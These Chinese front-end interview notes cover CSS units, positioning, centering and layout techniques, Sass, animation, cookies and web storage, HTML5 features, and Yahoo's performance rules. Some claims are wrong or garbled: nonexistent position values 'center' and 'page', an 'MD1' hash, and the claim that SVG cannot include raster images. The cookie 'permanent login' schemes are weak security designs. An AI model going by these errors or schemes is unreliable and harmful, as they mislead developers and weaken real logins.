### 4.CSS 尺寸单位，说说 em 与 rem 的区别

* 绝对长度单位包括：`cm`厘米（Centimeters）`mm`毫米（Millimeters）`q`1/4毫米（quarter-millimeters）`in`英寸（Inches)`pt`点、磅（Points）`pc`派卡（Picas），相当于我国新四号铅字的尺寸`px`
* 相对长度单位包括：`em`,`ex`,`ch`,`rem`,`vw`相对于视口的宽度，视口被均分为100单位的vw`vh`相对于视口的高度。视口被均分为100单位的vh`vmax`,`vmin`



**em 与 rem的区别**

* rem

rem是CSS3新增的一个相对单位（root em，根em），相对于根元素(即html元素)font-size计算值的倍数，只相对于根元素的大小 。rem（font size of the root element）是指相对于根元素的字体大小的单位。简单的说它就是一个相对单位。

作用：利用rem可以实现简单的响应式布局，可以利用html元素中字体的大小与屏幕间的比值设置font-size的值实现当屏幕分辨率变化时让元素也变化，以前的天猫tmall就使用这种办法

* em

文本相对长度单位。相对于当前对象内文本的字体尺寸。如当前对行内文本的字体尺寸未被人为设置，则相对于浏览器的默认字体尺寸(默认16px)。(相对父元素的字体大小倍数)

em（font size of the element）是指相对于父元素的字体大小的单位。它与rem之间其实很相似，区别在。（相对是的HTML元素的字体大，默认16px）

**em与rem的重要区别**： 它们计算的规则一个是依赖父元素另一个是依赖根元素计算


### 5.说说 box-sizing 属性的用法

* box-sizing:**content-box**： padding和border不被包含在定义的width和height之内。对象的实际宽度等于设置的width值和border、padding之和，即 ( Element width = width + border + padding，但占有页面位置还要加上margin ) 此属性表现为标准模式下的盒模型。
* box-sizing:**border-box**： padding和border被包含在定义的width和height之内。对象的实际宽度就等于设置的width值，即使定义有border和padding也不会改变对象的实际宽度，即 ( Element width = width ) 此属性表现为怪异模式下的盒模型。
### 6.说说对定位 positon 的理解

使用css布局position非常重要，语法如下：

position：static | relative | absolute | fixed | center | page | sticky

默认值：static，center、page、sticky是CSS3中新增加的值。

* static

可以认为静态的，默认元素都是静态的定位，对象遵循常规流。此时4个定位偏移属性不会被应用，也就是使用left，right，bottom，top将不会生效。

* relative

相对定位，对象遵循常规流，并且参照自身在常规流中的位置通过top，right，bottom，left这4个定位偏移属性进行偏移时不会影响常规流中的任何元素。

* absolute

a、绝对定位，对象脱离常规流，此时偏移属性参照的是离自身最近的定位祖先元素，如果没有定位的祖先元素，则一直回溯到body元素。盒子的偏移位置不影响常规流中的任何元素，其margin不与其他任何margin折叠。

b、元素定位参考的是离自身最近的定位祖先元素，要满足两个条件，第一个是自己的祖先元素，可以是父元素也可以是父元素的父元素，一直找，如果没有则选择body为对照对象。第二个条件是要求祖先元素必须定位，通俗说就是position的属性值为非static都行。

* fixed

固定定位，与absolute一致，但偏移定位是以窗口为参考。当出现滚动条时，对象不会随着滚动。

* center

与absolute一致，但偏移定位是以定位祖先元素的中心点为参考。盒子在其包含容器垂直水平居中。（CSS3）

* page

与absolute一致。元素在分页媒体或者区域块内，元素的包含块始终是初始包含块，否则取决于每个absolute模式。（CSS3）

* sticky

对象在常态时遵循常规流。它就像是relative和fixed的合体，当在屏幕中时按常规流排版，当卷动到屏幕外时则表现如fixed。该属性的表现是现实中你见到的吸附效果。（CSS3）


### 7.垂直水平居中的几种方法

水平居中

* 行内元素： text-align:center;
* flex 布局： justify-content: center;
* margin（width已设置）：margin: 0 auto;

垂直居中

* height: 100px;  line-height: 100px;
* table-cell, vertical-align:middle;
* flex: align-items: center;

垂直水平居中

* 设定行高 line-height为height一样数值，仅适用行内元素
```css
.div0{
  width:200px;
  height:150px;
  border:1px solid #000;
  line-height:150px;
  text-align:center;
}
.redbox{
  display:inline-block;
  width:30px;
  height:30px;
  background:#c00;
}
```
* 添加伪类元素：CSS里头vertical-align这个属性，这个属性虽然是垂直居中，不过却是指在元素内的所有元素垂直位置互相居中，并不是相对于外框的高度垂直居中。因此，如果有一个方块变成了高度100%，那么其他的方块就会真正的垂直居中。利用::before和::after添加div进到杠杠内，让这个“伪”div的高度100%
```css
.div0::before{
  content:'';
  width:0;
  height:100%;
  display:inline-block;
  position:relative;
  vertical-align:middle;
  background:#f00;
}
```
* calc 动态计算：我们只要让要居中的div的top属性，与上方的距离是“50%的外框高度+ 50%的div高度”，就可以做到垂直居中，至于为什么不用margin-top，因为margin相对的是水平宽度，必须要用top才会正确。
```css
.redbox{ 
  width:30px;
  height:30px; 
  background:#c00; 
  float:left; 
  top:calc(50% - 15px); 
  margin-left:calc(50% - 45px); 
}
```
* 使用表格或假装表格:在表格这个HTML里面常用的DOM里头，要实现垂直居中是相当容易的，只需要下一行vertical-align:middle就可以
* transform:利用transform里头的translateY（改变垂直的位移，如果使用百分比为单位，则是以元素本身的长宽为基准），搭配元素本身的top属性，就可以做出垂直居中的效果，比较需要注意的地方是，子元素必须要加上position:relative
* 绝对定位： 绝对定位就是CSS里头的position:absolute，利用绝对位置来指定，但垂直居中的做法又和我们正统的绝对位置不太相同，是要将上下左右的数值都设为0，再搭配一个margin:auto，就可以办到垂直居中，不过要特别注意的是，设定绝对定位的子元素，其父元素的position必须要指定为relative
```css
.use-absolute{
    position: relative;
    width:200px;
    height:150px;
    border:1px solid #000;
}
.use-absolute div{
    position: absolute;
    width:100px;
    height:50px;
    top:0;
    right:0;
    bottom:0;
    left:0;
    margin:auto;
    background:#f60;
}
```
flexbox: 使用align-items或align-content的属性
### 8.常见的页面布局的方式有哪些

方式：双飞翼、多栏、弹性、流式、瀑布流、响应式布局

* 双飞翼布局

经典三列布局，也叫做圣杯布局【Holy Grail of Layouts】是Kevin Cornell在2006年提出的一个布局模型概念，在国内最早是由淘宝UED的工程师传播开来，在中国也有叫法是双飞翼布局，它的布局要求有几点：

a、三列布局，中间宽度自适应，两边定宽；

b、中间栏要在浏览器中优先展示渲染；

c、允许任意列的高度最高；

d、要求只用一个额外的DIV标签；

e、要求用最简单的CSS、最少的HACK语句；

在不增加额外标签的情况下，圣杯布局已经非常完美，圣杯布局使用了相对定位，以后布局是有局限性的，而且宽度控制要改的地方也多。在淘宝UED（User Experience Design）探讨下，增加多一个div就可以不用相对布局了，只用到了浮动和负边距，这就是我们所说的双飞翼布局。

* 多栏布局

a、栏栅格系统：就是利用浮动实现的多栏布局，在bootstrap中用的非常多。

b、多列布局：栅格系统并没有真正实现分栏效果（如word中的分栏），CSS3为了满足这个要求增加了多列布局模块

* 弹性布局（Flexbox）

CSS3引入了一种新的布局模式——Flexbox布局，即伸缩布局盒模型（Flexible Box），用来提供一个更加有效的方式制定、调整和分布一个容器里项目布局，即使它们的大小是未知或者动态的，这里简称为Flex。Flexbox布局常用于设计比较复杂的页面，可以轻松的实现屏幕和浏览器窗口大小发生变化时保持元素的相对位置和大小不变，同时减少了依赖于浮动布局实现元素位置的定义以及重置元素的大小。

Flexbox布局在定义伸缩项目大小时伸缩容器会预留一些可用空间，让你可以调节伸缩项目的相对大小和位置。例如，你可以确保伸缩容器中的多余空间平均分配多个伸缩项目，当然，如果你的伸缩容器没有足够大的空间放置伸缩项目时，浏览器会根据一定的比例减少伸缩项目的大小，使其不溢出伸缩容器。

综合而言，Flexbox布局功能主要具有以下几点：

a、屏幕和浏览器窗口大小发生改变也可以灵活调整布局；

b、可以指定伸缩项目沿着主轴或侧轴按比例分配额外空间（伸缩容器额外空间），从而调整伸缩项目的大小；

c、可以指定伸缩项目沿着主轴或侧轴将伸缩容器额外空间，分配到伸缩项目之前、之后或之间；

d、可以指定如何将垂直于元素布局轴的额外空间分布到该元素的周围；

e、可以控制元素在页面上的布局方向；

f、可以按照不同于文档对象模型（DOM）所指定排序方式对屏幕上的元素重新排序。也就是说可以在浏览器渲染中不按照文档流先后顺序重排伸缩项目顺序。

* 瀑布流布局

瀑布流布局是流式布局的一种。是当下比较流行的一种网站页面布局，视觉表现为参差不齐的多栏布局，随着页面滚动条向下滚动，这种布局还会不断加载数据块并附加至当前尾部。最早采用此布局的网站是Pinterest，逐渐在国内流行开来。

**优点**

a、有效的降低了界面复杂度，节省了空间：我们不再需要臃肿复杂的页码导航链接或按钮了。

b、对触屏设备来说，交互方式更符合直觉：在移动应用的交互环境当中，通过向上滑动进行滚屏的操作已经成为最基本的用户习惯，而且所需要的操作精准程度远远低于点击链接或按钮。

c、更高的参与度：以上两点所带来的交互便捷性可以使用户将注意力更多的集中在内容而不是操作上，从而让他们更乐于沉浸在探索与浏览当中。

**缺点**

a、有限的用例：无限滚动的方式只适用于某些特定类型产品当中一部分特定类型的内容。 例如，在电商网站当中，用户时常需要在商品列表与详情页面之间切换，这种情况下，传统的、带有页码导航的方式可以帮助用户更稳妥和准确的回到某个特定的列表页面当中。

b、额外的复杂度：那些用来打造无限滚动的JS库虽然都自称很容易使用，但你总会需要在自己的产品中进行不同程度的定制化处理，以满足你们自己的需求;另外这些JS库在浏览器和设备兼容性等方面的表现也参差不齐，你必须做好充分的测试与调整工作。

c、再见了，页脚：如果使用了比较典型的无限滚动加载模式，这就意味着你可以和页脚说拜拜了。 最好考虑一下页脚对于你的网站，特别是用户的重要性;如果其中确实有比较重要的内容或链接，那么最好换一种更传统和稳妥的方式。千万不要耍弄你的用户，当他们一次次的浏览到页面底部，看到页脚，却因为自动加载的内容突然出现而无论如何都无法点击页脚中的链接时，他们会变的越发愤怒。

d、集中在一页当中动态加载数据，与一页一页的输出相比，究竟那种方式更利于SEO，这是你必须考虑的问题。对于某些以类型网站来说，在这方面进行冒险是很不划算的。

e、关于页面数量的印象：其实站在用户的角度来看，这一点并非负面;不过，如果对于你的网站来说，通过更多的内容页面展示更多的相关信息(包括广告)是很重要的策略，那么单页无限滚动的方式对你并不适用。

* 流式布局（Fluid）

固定布局和流式布局在网页设计中最常用的两种布局方式。固定布局能呈现网页的原始设计效果，流式布局则不受窗口宽度影响，流式布局使用百分比宽度来限定布局元素，这样可以根据客户端分辨率的大小来进行合理的显示。

* 响应式布局

响应式布局是Ethan Marcotte在2010年5月份提出的一个概念，简而言之，就是一个网站能够兼容多个终端——而不是为每个终端做一个特定的版本。这个概念是为解决移动互联网浏览而诞生的。响应式布局可以为不同终端的用户提供更加舒适的界面和更好的用户体验，而且随着目前大屏幕移动设备的普及，用“大势所趋”来形容也不为过。随着越来越多的设计师采用这个技术，我们不仅看到很多的创新，还看到了一些成形的模式。

**优点**

a、面对不同分辨率设备灵活性强

b、能够快捷解决多设备显示适应问题

**缺点**

a、兼容各种设备工作量大，效率低下

b、代码累赘，会出现隐藏无用的元素，加载时间加长

c、其实这是一种折中性质的设计解决方案，多方面因素影响而达不到最佳效果

d、一定程度上改变了网站原有的布局结构，会出现用户混淆的情况

**两栏布局，左侧定宽，右侧自适应**

```xml
<div id="wrapper1">
  <div class="left">
    左边固定宽度，高度不固定 </br> </br></br></br>高度有可能会很小，也可能很大。
  </div>
  <div class="main">
    这里的内容可能比左侧高，也可能比左侧低。宽度需要自适应。</br>
    基本的样式是，两个div相距20px, 左侧div宽 120px
  </div>
</div>
```
1.双 inline-block 方法

缺点**:**

* 需要知道左侧盒子的宽度，两个盒子的距离，还要设置各个元素的box-sizing
* 需要消除空格字符的影响
* 需要设置vertical-align: top满足顶端对齐。
```css
#wrapper1 {
  box-sizing: content-box;
  border: 1px solid red;
  padding: 15px 20px;
  font-size: 0; /*消除空格影响*/
}
#wrapper1 .left, .main {
  box-sizing: border-box;
  border: 1px solid blue;
  display: inline-block;  
  font-size: 14px;
  vertical-align: top; /* 顶端对齐*/
}
#wrapper1 .left {
  width: 200px;
}
#wrapper1 .main {
  width: calc(100% - 200px);
}
```
2.双 float 方法
缺点**:**

* 需要知道左侧盒子的宽度，两个盒子的距离，还要设置各个元素的box-sizing。
* 父元素需要清除浮动。
```css
#wrapper1 {
  box-sizing: content-box;
  border: 1px solid red;
  padding: 15px 20px;
  
  overflow: auto;
}
#wrapper1 .left, .main {
  box-sizing: border-box;
  border: 1px solid blue;
  
  float: left;
}
#wrapper1 .left {
  width: 200px;
}
#wrapper1 .main {
  width: calc(100% - 200px);
}
```
3.使用 float + margin-left 的方法
```css
#wrapper1 {
  box-sizing: border-box;
  border: 1px solid red;
  padding: 15px 20px;
  
  overflow: hidden;
}
#wrapper1 .left, .main {
  box-sizing: border-box;
  border: 1px solid blue;
}
#wrapper1 .left {
   float: left;
}
#wrapper1 .main {
   margin-left: 242px
}
```
4.使用 float + BFC 的方法
缺点**:**

* 父元素需要清除浮动

正常流中建立新的块格式化上下文的元素（例如除'visible'之外的'overflow'的元素）不能与元素本身相同的块格式上下文中的任何浮点的边界框重叠。

```css
#wrapper1 {
  box-sizing: content-box;
  border: 1px solid red;
  padding: 15px 20px;
  
  overflow: auto;
}
#wrapper1 .left, .main {
  box-sizing: border-box;
  border: 1px solid blue;
}
#wrapper1 .left {
  float: left;
}
#wrapper1 .main {
  overflow: auto;
}
```
5.使用 flex 方法
需要注意的是，flex容器的一个默认属性值:align-items: stretch;。这个属性导致了列等高的效果。 为了让两个盒子高度自动，需要设置: align-items: flex-start;

```css
#wrapper1 {
  box-sizing: content-box;
  border: 1px solid red;
  padding: 15px 20px;
  
  display: flex;
  align-items: flex-start;
}
#wrapper1 .left, .main {
  box-sizing: border-box;
  border: 1px solid blue;
}
#wrapper1 .left {
   flex: 0 0 auto;   //[ <'flex-grow'> <'flex-shrink'>? || <'flex-basis'> ]
}
#wrapper1 .main {
   flex: 1 1 auto;
}
```
6.使用 absulute + margin-left 的方法
缺点**:**

* 使用了绝对定位，若是用在某个div中，需要更改父容器的position。
* 没有清除浮动的方法，若左侧盒子高于右侧盒子，就会超出父容器的高度。因此只能通过设置父容器的min-height来放置这种情况。
```css
#wrapper1 {
  box-sizing: border-box;
  border: 1px solid red;
  padding: 15px 20px;
   
  min-height: 300px;
}
#wrapper1 .left, .main {
  box-sizing: border-box;
  border: 1px solid blue;
}
#wrapper1 .left {
   position: absolute;
}
#wrapper1 .main {
   margin-left: 242px
}
```
### 9.Sass 有什么特性

* 变量：允许使用变量，所有变量以$开头，如果变量需要镶嵌在字符串之中，就必须需要写在#{}之中。
* 计算功能：允许代码中直接使用算式
* 嵌套：允许直接在选择器中嵌套
* &嵌套：嵌套代码中可以使用 & 直接引用父元素
* @extend. 继承：允许一个选择器继承另一个选择器
* @mixin: 可定义可重用代码块,后续可以通过 @include 复用
* @import: 可以插入外部文件
* 提供注释：标准 /*comment*/ 回报率到编译后的文件；单行注释 //comment， 只保留在sass源文件中，编译后删除
10. css 动画，Animation特性

animation: name duration timing-function delay iteration-count direction fill-mode play-state;

（ 名称、长度、如何完成一周期、延迟、次数、是否轮流反向播放、不播放时样式、动画播放过程中可能会突然停止指定动画是否正在运行或暂停）

* animation-name 规定需要绑定到选择器的 keyframe 名称
* animation-duration 规定完成动画所花费的时间，以秒或毫秒计
* animation-timing-function 规定动画的速度曲线
* animation-delay 规定在动画开始之前的延迟
* animation-iteration-count 规定动画应该播放的次数
* animation-direction 规定是否应该轮流反向播放动画

我们还需要用keyframes关键字

```css
@keyframes rainbow {
  0% { background: #c00; }
  50% { background: orange; }
  100% { background: yellowgreen; }
}
```
### 11 css 实现 0.5px border

大致原理是：通过 css3插入一个伪元素，该元素宽度为父级2倍，高度为1px，然后通过css3缩放将其缩小一倍，从而实现一个 0.5 px 的边框。

```css
.content:before {
	content: ‘’;
    position:absolute;
    width:200%;
    height: 1px;
	border-bottom: 1px solid #000;
	transform-origin: 0, 0; -webkit-transform-origin
	transform: scale(.5,.5); -webkit-transform
	box-sizing: border-box; -webkit-boxsizing
}
```
### 12 css 实现三角形

|![图片](https://uploader.shimo.im/f/Wev9Or8KOMgAvJxd.png!thumbnail?fileGuid=6vX3hWyqpyWTRwHj)|#triangle-up {<br>width: 0;<br>height: 0;<br>border-left: 50px solid transparent;<br>border-right: 50px solid transparent;<br>border-bottom: 100px solid red;<br>}|
|:----|:----|:----|
|![图片](https://uploader.shimo.im/f/Qp6Cs20aOZ1F2bLr.png!thumbnail?fileGuid=6vX3hWyqpyWTRwHj)|#triangle-topleft {<br>width: 0;<br>height: 0;<br>border-top: 100px solid red;<br>border-right: 100px solid transparent;<br>}|

### 13 如何获取和设置盒子的宽高

```css
//第一种
dom.style.width/height //只能获取内联样式的元素宽高
//第二种
dom.currentStyle.width/height //只有IE浏览器支持
//第三种
dom.getComputedStyle(Dom).width/height //只有浏览器渲染后才能获取 兼容好
//第四种
dom.getBoundingClientRect().width/height //计算一个元素的绝对位置（相对于视窗左上角） 能拿到元素的left、right、width、height
```


## 三.HTML

### 1.浏览器存储 cookie、session、sessionStorage、localStorage

**Cookie**

* 每个特定的域名下最多生成20个cookie
* cookie的最大大约为**4096字节**，为了兼容性，一般不能超过4095字节。

**优点：**

极高的扩展性和可用性

1.通过良好的编程，控制保存在cookie中的session对象的大小。

2.通过加密和安全传输技术（SSL），减少cookie被破解的可能性。

3.只在cookie中存放不敏感数据，即使被盗也不会有重大损失。

4.控制cookie的生命期，使之不会永远有效。偷盗者很可能拿到一个过期的cookie。

**缺点**：

1.Cookie数量和长度的限制。每个domain最多只能有20条cookie，每个cookie长度不能超过4KB，否则会被截掉。

2.安全性问题。如果cookie被人拦截了，那人就可以取得所有的session信息。即使加密也与事无补，因为拦截者并不需要知道cookie的意义，他只要原样转发cookie就可以达到目的了。

3.有些状态不可能保存在客户端。例如，为了防止重复提交表单，我们需要在服务器端保存一个计数器。如果我们把这个计数器保存在客户端，那么它起不到任何作用。

**属性:**

**name**| string ： 该Cookie的名称。Cookie一旦创建，名称便不可更改

**value**| object ：该Cookie的值。如果值为Unicode字符，需要为字符编码。如果值为二进制数据，则需要使用BASE64编码

**maxAge**| int : 该Cookie失效的时间，单位秒。如果为正数，则该Cookie在maxAge秒之后失效。如果为负数，该Cookie为临时Cookie，关闭浏览器即失效，浏览器也不会以任何形式保存该Cookie。如果为0，表示删除该Cookie。默认为–1

**secure**| boolean : 该Cookie是否仅被使用安全协议传输。https，只在使用SSL安全连接的情况下才会把cookie发送到服务器

**path |**string**:**该Cookie的使用路径。请求URL中包含这个路径才会把cookie发送到服务器。如果设置为“/sessionWeb/”，则只有contextPath为“/sessionWeb”的程序可以访问该Cookie。如果设置为“/”，则本域名下contextPath都可以访问该Cookie。注意最后一个字符必须为“/”

**domain**| string : 可以访问该Cookie的域名。如果设置为“.google.com”，则所有以“google.com”结尾的域名都可以访问该Cookie。注意第一个字符必须为“.”

**comment**| string : 该Cookie的用处说明。

**version**| int : 该Cookie使用的版本号。0表示遵循Netscape的Cookie规范，1表示遵循W3C的RFC 2109规范

**httponly |  boolean :**表示此cookie必须用于http或https传输。这意味着，浏览器脚本，比如javascript中，是不允许访问操作此cookie的。以防范跨站脚本攻击（XSS）。

操作：

1.Cookie并不提供修改、删除操作。如果要修改某个Cookie，只需要新建一个同名的Cookie，添加到response中覆盖原来的Cookie。

2.如果要删除某个Cookie，只需要新建一个同名的Cookie，并将maxAge设置为0，并添加到response中覆盖原来的Cookie。注意是0而不是负数。负数代表其他的意义。

* 永久登录案例：
    * 一种方案是把密码加密后保存到**Cookie**中，下次访问时解密并与数据库比较。（高风险）
    * 如果不希望保存密码，还可以把登录的时间戳保存到Cookie与数据库中，到时只验证用户名与登录时间戳就可以了。
    * 实现方式是把账号按照一定的规则加密后，连同账号一块保存到**Cookie**中。下次访问时只需要判断账号的加密规则是否正确即可。本例把账号保存到名为account的Cookie中，把账号连同密钥用MD1[算法](http://lib.csdn.net/base/datastructure?fileGuid=6vX3hWyqpyWTRwHj)加密后保存到名为ssid的Cookie中。验证时验证Cookie中的账号与密钥加密后是否与Cookie中的ssid相等。

**LocalStorage**

**+**永久存储

**+**单个域名存储量比较大（推荐**5MB**，各浏览器不同）

**+**总体数量无限制

**SessionStorage**

**+**只在**Session**内有效

**+**存储量更大（推荐没有限制，但是实际上各浏览器也不同）

### 2.HTML 5 有哪些新特性

主要是关于图像、位置、存储、多任务等功能的增加。

* 拖拽释放 API（Drag and drop）
* 语义化更好的内容标签（header,nav,footer,aside,article,section）
* 音频、视频API(audio,video)
* 画布 API (Canvas)
* 地理 API (Geolocation)
* 本地离线存储 localStorage 长期存储数据，浏览器关闭后数据不丢失；
* sessionStorage 的数据在浏览器关闭后自动删除
* 表单控件，calendar、date、time、email、url、search
* 新的技术 webworker, websocket, Geolocation

移除的元素：

1. 纯表现的元素：basefont，big，center，font, s，strike，tt，u；

2. 对可用性产生负面影响的元素：frame，frameset，noframes；

### 3.iframe 的优缺点

* 优点
1. 解决加载缓慢的第三方内容如图表和广告等的加载问题
2. Security sandbox
3. 并行加载脚本
* 缺点
1. iframe 会阻塞主页面的 onload 事件
2. 搜索引擎的检索程序无法解读这种页面，不利于 SEO
3. iframe 和主页面共享连接池，而浏览器对相同域的连接有限制，所以会影响页面的并行加载

避免手段 如果使用 iframe，最好通过 js 动态给 iframe 添加 src 属性值。

### 4.Canvas 与 SVG 的区别

|**Canvas**|**SVG**|
|:----|:----|
|Canvas是基于像素的位图，依赖分辨率|SVG却是基于矢量图形，不依赖分辨率|
|Canvas是基于HTML canvas标签，通过宿主提供的Javascript API对整个画布进行操作的|SVG则是基于XML元素的,历史久远|
|Canvas没有图层的概念，所有的修改整个画布都要重新渲染|SVG则可以对单独的标签进行修改|
|关于动画，Canvas更适合做基于位图的动画|而SVG则适合图表的展示|
|不能被引擎抓取|可以被引擎抓取|
|Canvas 能够以 .png 或 .jpg 格式保存结果图像；能够引入 .png 或 .jpg格式的图片|SVG 不能以 .png 或 .jpg 格式保存结果图像；不能引入 .png 或 .jpg格式的图片|
|Canvas 不支持事件处理器（一旦图形被绘制完成，它就不会继续得到浏览器的关注。如果其位置发生变化，那么整个场景也需要重新绘制，包括任何或许已被图形覆盖的对象。）|SVG 支持事件处理器（SVG DOM 中的每个元素都是可用的。您可以为某个元素附加 JavaScript 事件处理器。每个被绘制的图形均被视为对象。如果 SVG 对象的属性发生变化，那么浏览器能够自动重现图形。）|
|最适合图像密集型的游戏，其中的许多对象会被频繁重绘|不适合游戏应用|

### 5.js 脚本延迟加载方式有哪些

1. defer和async
2. 动态创建DOM方式（创建script，插入到DOM中，加载完毕后callBack）
3. 按需异步载入js

**script 加载中的 async 与 defer 的区别**

* async 与 defer 共同点是采用异步的下载方式，不会阻塞 html 的解析
* 不同点在于 async 下载完还是会立即执行，defer 则是会在 html 解析完去执行，而 js 的执行还是会阻塞html 的解析的。
* 缺点：带有async 或者 defer属性的脚本执行也不一定按照顺序执行，有风险，因此确保两者之间互不依赖非常重要。（HTML5规范要求脚本按照它们出现的先后顺序执行，因此第一个延迟脚本会先于第二个延迟脚本执行，而这两个脚本会先于DOMContentLoaded事件执行。在现实当中，延迟脚本并不一定会按照顺序执行，也不一定会在DOMContentLoad时间触发前执行，因此最好只包含一个延迟脚本。）

![图片](https://uploader.shimo.im/f/cT3INbjFwcT9nPOK.png!thumbnail?fileGuid=6vX3hWyqpyWTRwHj)

**DOMContentLoaded, onload**

* DOMContentLoaded 当初始的 HTML 文档被完全加载和解析完成之后，DOMContentLoaded 事件被触发，而无需等待样式表、图像和子框架的完成加载。我们可以在这个阶段使用 JS 去访问元素。 async 的脚本可能还没有执行。
    * 带有 defer 的脚本会在页面加载和解析完毕后执行，刚好在 DOMContentLoaded 之前执行。
    * 图片及其他资源文件可能还在下载中。
* load 应该仅用于检测一个完全加载的页面 当一个资源及其依赖资源已完成加载时，将触发load事件。
* beforeunload 在用户即将离开页面时触发，它返回一个字符串，浏览器会向用户展示并询问这个字符串以确定是否离开。
* unload 在用户已经离开时触发，我们在这个阶段仅可以做一些没有延迟的操作，由于种种限制，很少被使用。
* document.readyState 表征页面的加载状态，可以在 readystatechange 中追踪页面的变化状态：
    * loading —— 页面正在加载中。
    * interactive —— 页面解析完毕，时间上和 DOMContentLoaded 同时发生，不过顺序在它之前。
    * complete —— 页面上的资源都已加载完毕，时间上和 window.onload 同时发生，不过顺序在他之前。


### 6.对于 web 性能优化的方法及理解（雅虎网站性能优化 34 条守则）

**一个http请求绝大多数的时间消耗在了建立连接跟等待的时间，优化的方法是减少http请求。**

1. 尽可能的减少 HTTP 的请求数	content

2. 使用 CDN（Content Delivery Network）内容分发网络	server

3. 添加 Expires 头(或者 Cache-control )	server

4. Gzip 组件	server

5. 将 CSS 样式放在页面的上方	css

6. 将脚本移动到底部（包括内联的）	javascript

7. 避免使用 CSS 中的 Expressions	css

8. 将 JavaScript 和 CSS 独立成外部文件	javascript css

9. 减少 DNS 查询	content

10. 压缩 JavaScript 和 CSS (包括内联的)	javascript css

11. 避免重定向	server

12. 移除重复的脚本	javascript

13. 配置实体标签（ETags）	css

14. 使 AJAX 缓存

雅虎团队经验：网站页面性能优化的34条黄金守则

1、尽量减少HTTP请求次数

终端用户响应的时间中，有80%用于下载各项内容。这部分时间包括下载页面中的图像、样式表、脚本、Flash等。通过减少页面中的元素可以减少HTTP请求的次数。这是提高网页速度的关键步骤。

减少页面组件的方法其实就是简化页面设计。那么有没有一种方法既能保持页面内容的丰富性又能达到加快响应时间的目的呢？这里有几条减少HTTP请求次数同时又可能保持页面内容丰富的技术。

合并文件是通过把所有的脚本放到一个文件中来减少HTTP请求的方法，如可以简单地把所有的CSS文件都放入一个样式表中。当脚本或者样式表在不同页面中使用时需要做不同的修改，这可能会相对麻烦点，但即便如此也要把这个方法作为改善页面性能的重要一步。

CSS Sprites是减少图像请求的有效方法。把所有的背景图像都放到一个图片文件中，然后通过CSS的background-image和background-position属性来显示图片的不同部分；

图片地图是把多张图片整合到一张图片中。虽然文件的总体大小不会改变，但是可以减少HTTP请求次数。图片地图只有在图片的所有组成部分在页面中是紧挨在一起的时候才能使用，如导航栏。确定图片的坐标和可能会比较繁琐且容易出错，同时使用图片地图导航也不具有可读性，因此不推荐这种方法；

内联图像是使用data:URL scheme的方法把图像数据加载页面中。这可能会增加页面的大小。把内联图像放到样式表（可缓存）中可以减少HTTP请求同时又避免增加页面文件的大小。但是内联图像现在还没有得到主流浏览器的支持。

减少页面的HTTP请求次数是你首先要做的一步。这是改进首次访问用户等待时间的最重要的方法。如同Tenni Theurer的他的博客Browser Cahe Usage - Exposed!中所说，HTTP请求在无缓存情况下占去了40%到60%的响应时间。让那些初次访问你网站的人获得更加快速的体验吧！

2、减少DNS查找次数

域名系统（DNS）提供了域名和IP的对应关系，就像电话本中人名和他们的电话号码的关系一样。当你在浏览器地址栏中输入[www.dudo.org](http://www.dudo.org/?fileGuid=6vX3hWyqpyWTRwHj)时，DNS解析服务器就会返回这个域名对应的IP地址。DNS解析的过程同样也是需要时间的。一般情况下返回给定域名对应的IP地址会花费20到120毫秒的时间。而且在这个过程中浏览器什么都不会做直到DNS查找完毕。

缓存DNS查找可以改善页面性能。这种缓存需要一个特定的缓存服务器，这种服务器一般属于用户的ISP提供商或者本地局域网控制，但是它同样会在用户使用的计算机上产生缓存。DNS信息会保留在操作系统的DNS缓存中（微软Windows系统中DNS Client Service）。大多数浏览器有独立于操作系统以外的自己的缓存。由于浏览器有自己的缓存记录，因此在一次请求中它不会受到操作系统的影响。

Internet Explorer默认情况下对DNS查找记录的缓存时间为30分钟，它在注册表中的键值为DnsCacheTimeout。Firefox对DNS的查找记录缓存时间为1分钟，它在配置文件中的选项为network.dnsCacheExpiration（Fasterfox把这个选项改为了1小时）。

当客户端中的DNS缓存都为空时（浏览器和操作系统都为空），DNS查找的次数和页面中主机名的数量相同。这其中包括页面中URL、图片、脚本文件、样式表、Flash对象等包含的主机名。减少主机名的数量可以减少DNS查找次数。

减少主机名的数量还可以减少页面中并行下载的数量。减少DNS查找次数可以节省响应时间，但是减少并行下载却会增加响应时间。我的指导原则是把这些页面中的内容分割成至少两部分但不超过四部分。这种结果就是在减少DNS查找次数和保持较高程度并行下载两者之间的权衡了。

3、避免跳转

跳转是使用301和302代码实现的。下面是一个响应代码为301的HTTP头：

HTTP/1.1 301 Moved Permanently

Location:[http://example.com/newuri](http://example.com/newuri?fileGuid=6vX3hWyqpyWTRwHj)

Content-Type: text/html

浏览器会把用户指向到Location中指定的URL。头文件中的所有信息在一次跳转中都是必需的，内容部分可以为空。不管他们的名称，301和302响应都不会被缓存除非增加一个额外的头选项，如Expires或者Cache-Control来指定它缓存。<meat />元素的刷新标签和JavaScript也可以实现URL的跳转，但是如果你必须要跳转的时候，最好的方法就是使用标准的3XXHTTP状态代码，这主要是为了确保“后退”按钮可以正确地使用。

但是要记住跳转会降低用户体验。在用户和HTML文档中间增加一个跳转，会拖延页面中所有元素的显示，因为在HTML文件被加载前任何文件（图像、Flash等）都不会被下载。

有一种经常被网页开发者忽略却往往十分浪费响应时间的跳转现象。这种现象发生在当URL本该有斜杠（/）却被忽略掉时。例如，当我们要访问[http://astrology.yahoo.com/astrology](http://astrology.yahoo.com/astrology?fileGuid=6vX3hWyqpyWTRwHj)时，实际上返回的是一个包含301代码的跳转，它指向的是[http://astrology.yahoo.com/astrology/](http://astrology.yahoo.com/astrology/?fileGuid=6vX3hWyqpyWTRwHj)（注意末尾的斜杠）。在Apache服务器中可以使用Alias 或者 mod_rewrite或者the DirectorySlash来避免。

连接新网站和旧网站是跳转功能经常被用到的另一种情况。这种情况下往往要连接网站的不同内容然后根据用户的不同类型（如浏览器类型、用户账号所属类型）来进行跳转。使用跳转来实现两个网站的切换十分简单，需要的代码量也不多。尽管使用这种方法对于开发者来说可以降低复杂程度，但是它同样降低用户体验。一个可替代方法就是如果两者在同一台服务器上时使用Alias和mod_rewrite和实现。如果是因为域名的不同而采用跳转，那么可以通过使用Alias或者mod_rewirte建立CNAME（保存一个域名和另外一个域名之间关系的DNS记录）来替代。

4、可缓存的AJAX

